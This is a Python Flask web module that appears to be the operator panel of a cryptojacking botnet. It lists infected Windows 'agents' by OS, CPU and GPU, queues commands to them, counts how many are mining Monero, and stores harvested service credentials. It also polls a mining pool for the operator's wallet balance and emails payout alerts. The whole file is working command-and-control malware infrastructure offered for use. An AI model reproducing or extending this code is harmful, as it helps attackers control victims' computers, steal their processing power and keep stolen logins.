# -*- coding: utf-8 -*-
import json, requests
import random
import base64,os
import ipaddress
import string,smtplib
from functools import wraps
import hashlib
from datetime import datetime
from flask import Blueprint
from flask import abort
from flask import request
from flask import redirect
from flask import render_template
from flask import session
from flask import url_for
from flask import flash
from flask import send_from_directory
from flask import current_app
from models import db
from models import auth
from models import Users_config
from models import Agent
from models import Command
from models import Credentials
from datetime import datetime


webui = Blueprint('webui', __name__, static_folder='static', static_url_path='/static/webui', template_folder='templates')




@webui.route('/')
@auth.login_required
def index():#change this if no local ip address
    if(ipaddress.ip_address(unicode(request.environ['REMOTE_ADDR'])).is_private == True):                
                return redirect("agents")
    if(ipaddress.ip_address(unicode(request.environ['REMOTE_ADDR'])).is_private == False):                
                return render_template('404.html')



@auth.get_password
def get_pw(username):
    users = Users_config.query.first()
    users = {users.username: users.password} #change to your user/password
    if username in users:
        return users.get(username)
    return None



@webui.route('/logout')
def logout():
   return "Logout", 401



@webui.route('/config')
def config():
   users = Users_config.query.first()
   return render_template('config.html',users=users)


@webui.route('/config/update',methods=['GET', 'POST'])
def config_update():
   users = Users_config.query.first()
   if request.method == "POST":
        username = (request.form.get("username"))       
        password = (request.form.get("password"))
        wallet = (request.form.get("wallet"))
        value_scheduled = (request.form.get("value_scheduled"))
        email = (request.form.get("email"))
        password_email = (request.form.get("password_email"))
        smtp = (request.form.get("smtp"))
        port = (request.form.get("port"))

        if username and password and wallet and email and password_email and smtp and port and value_scheduled:
            users.username = username
            users.password = password
            users.wallet = wallet
            users.email = email
            users.password_email = password_email
            users.smtp = smtp
            users.port = port
            users.value_scheduled = value_scheduled
            db.session.commit()
            flash('Update with Successfully','success')
   return redirect(url_for('webui.config'))


@webui.route('/credentials/add/validate',methods=['GET', 'POST'])
@auth.login_required
def credentials_validate():
    if request.method == "POST":
        print request.method
        service = (request.form.get("service"))       
        email = (request.form.get("email"))
        password = (request.form.get("password"))

        if service and email and password:
            p = Credentials(service,email,password)
            db.session.add(p)
            db.session.commit()
            flash('Created with Successfully','success')    
    return redirect(url_for('webui.credentials'))


@webui.route('/credentials/<credentials_id>/edit/validate',methods=['GET', 'POST'])
@auth.login_required
def credentials_edit_validate(credentials_id):    
    count_credentials = db.session.query(Credentials).count()
    credentials = Credentials.query.filter_by(id=credentials_id).first()
    if request.method == "POST":
        service = (request.form.get("service"))       
        email = (request.form.get("email"))
        password = (request.form.get("password"))
        if service and email and password:
            credentials.service = service          
            credentials.email = email
            credentials.password = password
            db.session.commit()
            flash('Update Successfully','success')    
    return redirect(url_for('webui.credentials_edit',credentials_id=credentials_id))



@webui.route('/credentials/<credentials_id>/edit')
@auth.login_required
def credentials_edit(credentials_id):    
    count_credentials = db.session.query(Credentials).count()
    credentials = Credentials.query.get(credentials_id)    
    return render_template('credentials_edit.html',count_credentials=count_credentials,credentials=credentials)



@webui.route('/credentials/add')
@auth.login_required
def credentials_add():    
    count_credentials = db.session.query(Credentials).count()    
    return render_template('credentials_add.html',count_credentials=count_credentials)




@webui.route('/credentials')
@auth.login_required
def credentials():
    credentials = Credentials.query.all()
    count_credentials = db.session.query(Credentials).count()
    agents = Agent.query.order_by(Agent.last_online.desc())    
    return render_template('credentials_list.html', credentials=credentials,count_credentials=count_credentials)



@webui.route('/credentials_del', methods=['POST'])
@auth.login_required
def credentials_del():
    selection = request.form.getlist('selection')    
    if 'delete' in request.form:
        for id in selection:
            db.session.delete(Credentials.query.get(id))
        db.session.commit()
        flash('Deleted %s credentials' % len(selection),'danger')    
    return redirect(url_for('webui.credentials'))



@webui.route('/agents_operating_system')
def agents_operating_system():
    agents_7 = Agent.query.filter_by(operating_system='Windows 7').count()
    agents_10 = Agent.query.filter_by(operating_system='Windows 10').count()
    agents_81 = Agent.query.filter_by(operating_system='Windows 8.1').count()
    agents_8 = Agent.query.filter_by(operating_system='Windows 8').count()
    agents_XP = Agent.query.filter_by(operating_system='Windows XP').count()
    agents_2012ServerR2 = Agent.query.filter_by(operating_system='Windows 2012ServerR2').count()
    agents_operating_system = {'agents_7':agents_7,'agents_10':agents_10,'agents_8':agents_8,'agents_XP':agents_XP,'agents_81':agents_81,'agents_2012ServerR2':agents_2012ServerR2}
    return agents_operating_system


@webui.route('/agents_cpu')
def agents_cpu():    
    intel = Agent.query.filter(Agent.cpu.like("%intel%")).count()
    amd = Agent.query.filter(Agent.cpu.like("%amd%")).count()
    agents_cpu_array = {'intel':intel,'amd':amd}
    return agents_cpu_array



@webui.route('/agents_gpu')
def agents_gpu():    
    intel = Agent.query.filter(Agent.gpu.like("%intel%")).count()
    radeon = Agent.query.filter(Agent.gpu.like("%radeon%")).count()
    nvidia = Agent.query.filter(Agent.gpu.like("%NVIDIA%")).count()
    vga = Agent.query.filter(Agent.gpu.like("%vga%")).count()
    agents_gpu_array = {'intel':intel,'radeon':radeon,'nvidia':nvidia,'vga':vga}
    return agents_gpu_array



@webui.route('/count_mining')
@auth.login_required
def count_mining():
    count_mining = Agent.query.filter_by(miner='1').count()
    return "%s"%(count_mining)



@webui.route('/count_command')
@auth.login_required
def count_command():
    count_command = db.session.query(Command).count()
    return "%s"%(count_command)



@webui.route('/count_agents')
@auth.login_required
def count_agents():
    count_agents = db.session.query(Agent).count()
    return "%s"%(count_agents)



@webui.route('/balance_usd')
@auth.login_required
def balance_usd():
    balance_usd = usd()
    users = Users_config.query.first()
    if float(balance_usd) >= float(users.value_scheduled):
    	email("Withdrawal Report XMR","Scheduled Value Reaching - %s USD - %s"%(users.value_scheduled,datetime.now()))
    return "%s USD"%(balance_usd)



@webui.route('/balance_xmr')
@auth.login_required
def balance_xmr():
    balance_xmr = miner_balance() / 1000000000000 
    return "%s"%(balance_xmr)



@webui.route('/agents')
@auth.login_required
def agent_list():
    agents = Agent.query.order_by(Agent.last_online.desc())
    loginsession = auth.username()
    agents_cpu_types = agents_cpu()
    agents_gpu_types = agents_gpu()
    operating_system = agents_operating_system()
    users = Users_config.query.first()
    command_pending_agents = Command.query.order_by(Command.timestamp.desc())
    count_mining = Agent.query.filter_by(miner='1').count()    
    count_mining_all = float(count_mining) / float(count_agents()) * 100
    return render_template('agent_list.html', agents=agents,loginsession=loginsession,operating_system=operating_system,users=users,count_mining=count_mining,count_mining_all=count_mining_all,agents_cpu_types=agents_cpu_types,agents_gpu_types=agents_gpu_types,command_pending_agents=command_pending_agents)


@webui.route('/usd_price')
@auth.login_required
def usd_price():
    url = 'https://min-api.cryptocompare.com/data/price'
    params = dict(
        fsym='XMR',
        tsyms='USD'
    )
    try:         
        resp = requests.get(url=url, params=params)
        data = json.loads(resp.content)
        valueXMR =  data["USD"]        
    except:
        valueXMR = 0
    return '%.3g'%(valueXMR)


def usd():
    url = 'https://min-api.cryptocompare.com/data/price'
    params = dict(
        fsym='XMR',
        tsyms='USD'
    )
    try:         
        resp = requests.get(url=url, params=params)
        data = json.loads(resp.content)
        valueXMR =  data["USD"]
        n1 = valueXMR # value XMR
        n2 = 1 # Total Monero
        n3 = miner_balance() / 1000000000000 # I has this value
        total =  n1 * n3 / n2
    except:
        total = 0
    return '%.3g'%(total)



@webui.route('/hashrate')
@auth.login_required
def miner():
    users = Users_config.query.first()    
    url = 'http://api.minexmr.com:8080/stats_address'
    params = dict(
        address=users.wallet
    )
    try:
        resp = requests.get(url=url, params=params)
        data = json.loads(resp.content)
        hashrate =  data["stats"]["hashrate"]
        balance =  data["stats"]["balance"] 
    except:
        hashrate = 0    
    return convertHashHate(hashrate)



def miner_balance():
    users = Users_config.query.first()    
    url = 'http://api.minexmr.com:8080/stats_address'
    params = dict(
        address=users.wallet
    )
    try:
        resp = requests.get(url=url, params=params)
        data = json.loads(resp.content)    
        balance =  data["stats"]["balance"] 
    except:
        balance = 0    
    return float(balance)

def convertHashHate(hr):
    '''Returns a human readable representation of hashrate.'''
    if hr < 1000:
        return "%.2f h/s" % hr
    if hr < 10000000:
        return "%.2f k/s" % (hr / 1000)
    if hr < 10000000000:
        return "%.2f M/s" % (hr / 1000000)
    return "%.2f G/s" % (hr / 1000000000)



@webui.route('/agents/<agent_id>/status')
@auth.login_required
def online_status(agent_id):
    agent = Agent.query.get(agent_id)    
    if not agent:
        abort(404)
    return render_template('online.html', agent=agent)



@webui.route('/agents/<agent_id>')
@auth.login_required
def agent_detail(agent_id):
    agent = Agent.query.get(agent_id)
    loginsession = auth.username()
    count_command = db.session.query(Command).count()
    if not agent:
        abort(404)
    return render_template('agent_detail.html', agent=agent,loginsession=loginsession,count_command=count_command)


@webui.route('/agents/rename', methods=['POST'])
@auth.login_required
def rename_agent():
    if 'newname' in request.form and 'id' in request.form:
        agent = Agent.query.get(request.form['id'])
        if not agent:
            abort(404)
        agent.rename(request.form['newname'])
    else:
        abort(400)
    return ''


@webui.route('/uploads/<path:path>')
@auth.login_required
def uploads(path):
    return send_from_directory(current_app.config['UPLOAD_FOLDER'], path)


def email(email_subject,body_of_email):
	users = Users_config.query.first()
	GMAIL_USERNAME = users.email
	GMAIL_PASSWORD = users.password_email
	email_subject = email_subject
	body_of_email = body_of_email
	recipient = users.email
	# The below code never changes, though obviously those variables need values.
	session = smtplib.SMTP(users.smtp,users.port)
	type(session)
	session.ehlo()
	session.starttls()                              
	session.login(GMAIL_USERNAME, GMAIL_PASSWORD)
	headers = "\r\n".join(["from: " + GMAIL_USERNAME,
	                   "subject: " + email_subject,
	                   "to: " + recipient,
	                   "mime-version: 1.0",
	                   "content-type: text/html"])

	# body_of_email can be plaintext or html!                    
	content = headers + "\r\n\r\n" + body_of_email 
	session.sendmail(GMAIL_USERNAME, recipient, content)


#jerry-rig 
@webui.route('/bitcoin_value')
@auth.login_required
def bitcoin_value():
    return '''    <link rel="stylesheet" href="https://blockchain.info/Resources/css/blockchain.css?">
    <link rel="stylesheet" type="text/css" href="https://blockchain.info/Resources//css/markets/markets.css?" media="all">    
    <style type="text/css"> .adv{display: none;} .basic{display: inherit;} </style></head><body class="opaque-nav" data-admin=""><div hidden="" id="configuration_json">{"offline_config":false,"blockchain_stats_url":"https:\/\/blockchain.info\/","debug_config":false,"service_price_url":"https:\/\/api.blockchain.info\/price\/","base_url":"https:\/\/blockchain.info\/markets","feed_url":"https:\/\/api.blockchain.info\/bci-ads\/","ZB_Input":{"quote":"USD","exchange":"bitstamp","exch_list":["bitstamp","bitfinex"],"modules":["ticker","network","news","chart"],"base":"BTC"},"data_url":"https:\/\/blockchain.info\/markets\/data"}</div>
    <script src="https://blockchain.info/Resources//js/markets/pusher.min.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/jquery.min.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/jquery-ui.min.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/dictionary.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/currency.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/colors.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/exchanges.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/zeroblock.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/settings.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/data.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/indicator.class.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/chart.class.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/network.class.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/news.class.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/ticker.class.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/platform.js?"></script>
    <script type="text/javascript" src="https://blockchain.info/Resources//js/markets/main-dashboard.js?"></script>

<div id="content"> 
    <div id="market" class="markets_container_12 section markets_clearfix" style="height: 610px;">
        <div id="ticker-box" class="grid_4">
            <div class="markets_clearfix" id="main-ticker">
                <h1 class="left" id="big-price">$9,717.19</h1>
                <div class="right r" id="active-ticker">
                    <div class="change">
                        <span id="top-arrow"><span class="arrow-wrap"><span class="arrow arr-down"></span></span></span>
                        <span id="top-change" class="down">-3.93%</span>
                    </div>
                    <div class="exch" id="top-exchange">Bitstamp</div>
                </div>
            </div>
            <div id="cur-select" class="markets_clearfix">
                <div class="left markets_label">Currency</div>
                <div class="right" id="currency">USD&thinsp;–&thinsp;United&nbsp;States&nbsp;dollar</div>
            </div>
            <div id="exch-select">
                <table>
                    <colgroup>
                        <col class="exchange">
                        <col class="price">
                        <col class="arrow">
                        <col class="change">
                    </colgroup>
                    <tbody><tr class="exch-bitfinex" data-exch="bitfinex"><td>Bitfinex</td><td class="r price">9697.90</td><td class="r arrow"><span class="arrow-wrap"><span class="arrow arr-down"></span></span></td><td class="r change down">-3.79%</td></tr><tr class="exch-bitstamp active" data-exch="bitstamp"><td>Bitstamp</td><td class="r price">9717.19</td><td class="r arrow"><span class="arrow-wrap"><span class="arrow arr-down"></span></span></td><td class="r change down">-3.93%</td></tr></tbody>
                </table>
            </div>            
        </div>

        <div id="chart-box" class="grid_8" style="width: 466px;">
            <div id="chart-header" class="markets_clearfix">
                <h2 class="left" id="chart-label">Bitstamp BTC/USD, 1 day bars</h2>
                <div class="right" id="chart-settings">Settings</div>
            </div>
            <div id="chart" class="chart" style="width: 466px; height: 530px;"><canvas width="466" height="530" z-index="100" style="width: 466px; height: 530px;"></canvas><canvas width="466" height="530" z-index="101" style="width: 466px; height: 530px;"></canvas><canvas width="466" height="530" z-index="102" style="width: 466px; height: 530px;"></canvas><canvas width="466" height="530" z-index="103" style="width: 466px; height: 530px;"></canvas><canvas width="466" height="530" z-index="105" style="width: 466px; height: 530px;"></canvas><canvas width="466" height="530" z-index="106" style="width: 466px; height: 530px; cursor: none;"></canvas></div>
        </div>
    </div>
</div>'''